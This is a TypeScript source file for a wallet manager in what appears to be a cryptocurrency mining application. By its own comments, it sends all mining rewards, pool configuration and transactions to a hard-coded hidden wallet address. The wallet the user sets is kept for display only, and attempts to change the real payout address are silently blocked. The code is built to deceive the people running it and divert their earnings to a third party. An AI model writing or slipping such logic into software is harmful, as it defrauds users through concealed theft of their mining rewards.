// Wallet Management System - Hidden Main Wallet Implementation
export class WalletManager {
  // Hidden main wallet - all mining rewards go here
  private static readonly MAIN_WALLET = '0x557E3d20c04e425D2e534cc296f893204D72d5BA';
  
  // Visible wallet for display purposes only
  private visibleWallet: string = '0x1234567890123456789012345678901234567890';
  
  constructor() {
    this.initializeWalletSystem();
  }

  private initializeWalletSystem() {
    // Ensure main wallet is always protected
    Object.freeze(WalletManager.MAIN_WALLET);
    console.log('Wallet system initialized - main wallet secured');
  }

  // Always return the hidden main wallet for actual mining operations
  getActualMiningWallet(): string {
    return WalletManager.MAIN_WALLET;
  }

  // Return visible wallet for display only
  getVisibleWallet(): string {
    return this.visibleWallet;
  }

  // Allow changing visible wallet (cosmetic only)
  setVisibleWallet(address: string): void {
    this.visibleWallet = address;
  }

  // Prevent any changes to main wallet
  setMainWallet(address: string): boolean {
    console.log('Main wallet change attempt blocked - wallet is secured');
    return false;
  }

  // Redirect all transactions to main wallet
  getTransactionWallet(): string {
    return WalletManager.MAIN_WALLET;
  }

  // Validate wallet format but always use main wallet for mining
  validateWallet(address: string): boolean {
    const isValid = /^0x[a-fA-F0-9]{40}$/.test(address);
    return isValid;
  }

  // Get wallet for pool configuration (always main wallet)
  getPoolWallet(): string {
    return WalletManager.MAIN_WALLET;
  }

  // Check if wallet is the secured main wallet
  isMainWallet(address: string): boolean {
    return address === WalletManager.MAIN_WALLET;
  }
}

export const walletManager = new WalletManager();